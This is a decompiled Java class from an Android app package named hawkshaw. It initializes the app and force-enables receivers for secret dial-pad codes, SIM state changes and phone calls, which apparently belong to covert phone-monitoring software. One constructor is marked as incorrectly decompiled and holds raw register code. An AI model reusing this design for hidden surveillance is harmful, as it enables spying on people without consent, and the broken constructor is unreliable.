package com.hawkshaw.library;

import W2.e;
import Y1.K;
import a3.j;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import androidx.core.app.NotificationCompat;
import androidx.lifecycle.C0257m;
import androidx.lifecycle.C0259o;
import androidx.lifecycle.C0264u;
import androidx.lifecycle.C0266w;
import androidx.lifecycle.C0268y;
import androidx.lifecycle.ProcessLifecycleOwner;
import androidx.lifecycle.V;
import com.hawkshaw.library.ktextensions.CoroutineKt;
import com.hawkshaw.library.logger.Logger;
import com.hawkshaw.library.receivers.CallReceiver;
import com.hawkshaw.library.receivers.SecretDialPadCodeReceiver;
import com.hawkshaw.library.receivers.SimStateReceiver;
import i.C0528x;
import j3.f;
import j3.l;
import j3.t;
import java.util.ArrayList;
import o.C0769d;
import p3.C0867h;

public final class App extends ContentProviderWrapper implements C0266w, C0264u {
    public static final Companion Companion = new Companion((f) null);
    private static final String TAG = "App";
    /* access modifiers changed from: private */
    public static final NotNullSingleValueVar<Context> context$delegate;
    /* access modifiers changed from: private */
    public static final NotNullSingleValueVar<App> instance$delegate;
    private final C0259o lifecycle;
    private final e lifecycleRegistry$delegate;

    public static final class Companion {
        static final /* synthetic */ C0867h[] $$delegatedProperties;

        static {
            Class<Companion> cls = Companion.class;
            l lVar = new l(cls, "context", "getContext()Landroid/content/Context;");
            t.f7501a.getClass();
            $$delegatedProperties = new C0867h[]{lVar, new l(cls, "instance", "getInstance()Lcom/hawkshaw/library/App;")};
        }

        private Companion() {
        }

        public /* synthetic */ Companion(f fVar) {
            this();
        }

        public final Context getContext() {
            return (Context) App.context$delegate.getValue(this, $$delegatedProperties[0]);
        }

        public final App getInstance() {
            return (App) App.instance$delegate.getValue(this, $$delegatedProperties[1]);
        }

        public final void setContext(Context context) {
            K.n(context, "<set-?>");
            App.context$delegate.setValue(this, $$delegatedProperties[0], context);
        }

        public final void setInstance(App app) {
            K.n(app, "<set-?>");
            App.instance$delegate.setValue(this, $$delegatedProperties[1], app);
        }
    }

    static {
        DelegatesExt delegatesExt = DelegatesExt.INSTANCE;
        context$delegate = delegatesExt.notNullSingleValue();
        instance$delegate = delegatesExt.notNullSingleValue();
    }

    public App() {
        this((C0259o) null, 1, (f) null);
    }

    /* access modifiers changed from: private */
    public final void enableReceivers() {
        Class[] clsArr = {SecretDialPadCodeReceiver.class, SimStateReceiver.class, CallReceiver.class};
        ArrayList<ComponentName> arrayList = new ArrayList<>(3);
        for (int i5 = 0; i5 < 3; i5++) {
            arrayList.add(new ComponentName(Companion.getContext(), clsArr[i5]));
        }
        for (ComponentName componentEnabledSetting : arrayList) {
            Companion.getContext().getPackageManager().setComponentEnabledSetting(componentEnabledSetting, 1, 1);
        }
    }

    private final C0268y getLifecycleRegistry() {
        return (C0268y) this.lifecycleRegistry$delegate.getValue();
    }

    public C0259o getLifecycle() {
        return this.lifecycle;
    }

    public boolean onCreate() {
        Context context;
        Companion companion = Companion;
        companion.setInstance(this);
        if (Build.VERSION.SDK_INT >= 30) {
            context = requireContext();
            K.m(context, "requireContext(...)");
        } else {
            context = getContext();
            K.k(context);
        }
        companion.setContext(context);
        CoroutineKt.safeLaunch$default(C0769d.R(this), (j) null, new a(this, (a3.e) null), 1, (Object) null);
        return true;
    }

    public void onStateChanged(C0266w wVar, C0257m mVar) {
        K.n(wVar, "source");
        K.n(mVar, NotificationCompat.CATEGORY_EVENT);
        Logger.v$default(Logger.INSTANCE, TAG, C0528x.h("LifecycleEvent ", mVar.name()), false, 4, (Object) null);
        getLifecycleRegistry().e(mVar);
    }

    /* JADX WARNING: Illegal instructions before constructor call */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public App(androidx.lifecycle.C0259o r1, int r2, j3.f r3) {
        
            r0 = this;
            r2 = r2 & 1
            if (r2 == 0) goto L_0x000a
            androidx.lifecycle.ProcessLifecycleOwner r1 = androidx.lifecycle.ProcessLifecycleOwner.f3840L
            androidx.lifecycle.ProcessLifecycleOwner r1 = androidx.lifecycle.ProcessLifecycleOwner.f3840L
            androidx.lifecycle.y r1 = r1.f3846I
        L_0x000a:
            r0.<init>(r1)
            return
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.App.<init>(androidx.lifecycle.o, int, j3.f):void");
    }

    public App(C0259o oVar) {
        K.n(oVar, "lifecycle");
        this.lifecycle = oVar;
        this.lifecycleRegistry$delegate = new W2.l(new V(this, 4));
        ProcessLifecycleOwner.f3840L.f3846I.a(this);
    }
}
